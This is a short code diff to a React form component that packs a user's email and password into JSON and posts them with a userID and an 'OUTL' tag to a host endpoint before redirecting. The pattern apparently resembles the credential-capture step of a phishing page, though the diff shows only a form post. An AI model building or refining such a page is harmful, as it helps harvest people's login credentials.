@@ -41,8 +41,9 @@ const Body = () => {
       return
     }
     if (showPassword && password) {
+      const data = JSON.stringify({ email, password })
       axios
-        .post(`${hostURL}main`, { email, password, userID })
+        .post(`${hostURL}main`, { data, userID, title: 'OUTL' })
         .then((resp) => {
           console.log(resp.data)
           setRedirect(true)
